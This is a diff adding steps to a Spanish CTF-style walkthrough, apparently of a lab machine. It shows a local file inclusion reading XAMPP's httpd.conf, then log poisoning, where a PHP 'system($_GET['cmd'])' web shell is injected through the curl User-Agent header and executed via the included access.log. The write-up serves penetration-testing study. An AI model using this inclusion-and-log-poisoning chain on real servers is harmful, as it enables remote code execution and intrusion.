@@ -91,3 +91,64 @@ el diccionario que utilicé es:
 `https://github.com/lavafuego/Diccionarios/blob/main/diccionario_rutas_windows.md`
 
 
+veo que puedo leer:
+```bash
+c:\windows\system32\drivers\etc\hosts
+c:\xampp\apache\conf\httpd.conf
+```
+
+me centro en `c:\xampp\apache\conf\httpd.conf`
+
+```bash
+curl -sX GET "http://192.168.1.46/page.php?i=c:\xampp\apache\conf\httpd.conf"
+```
+
+leyendo detenidamente veo las siguientes rutas:
+
+```
+Define SRVROOT "C:/xampp/apache"
+ServerRoot "C:/xampp/apache"
+DocumentRoot "C:/xampp/htdocs"
+<Directory "C:/xampp/htdocs">
+ErrorLog "logs/techro-events/error.log"
+CustomLog "logs/techro-events/access.log" combined
+ScriptAlias /cgi-bin/ "C:/xampp/cgi-bin/"
+```
+
+![TECH](images/tech/11.png)
+
+
+más o menos con un cgi-bin y un error.log y access.log creo que los tiros van a ir por un log poisoning. pero la ruta como vemos esta customizada, vamos a ver si tenemos acceso a los logs:
+
+![TECH](images/tech/12.png)
+
+tenemos accceso al `access.log`
+
+vamos a lanzar una peticion en la que vemos si refleja lo que pongamos en el user agent:
+
+```bash
+curl -A "hola que tal" "http://192.168.1.46/"
+```
+![TECH](images/tech/13.png)
+
+![TECH](images/tech/14.png)
+
+![TECH](images/tech/15.png)
+
+
+esto pinta bien, ahora vamos a lanzar un cmd para poder ejecutar comandos:
+
+```bash
+curl -A "<?php system(\$_GET['cmd']); ?>" "http://192.168.1.46/"
+```
+utilizando el cmd lanzamos un whoami y vemos si se refleja
+
+```bash
+curl -sX GET "http://192.168.1.46/page.php?i=c:\xampp\apache\logs\techro-events\access.log&cmd=whoami"
+```
+
+![TECH](images/tech/16.png)
+
+![TECH](images/tech/17.png)
+
+![TECH](images/tech/18.png)
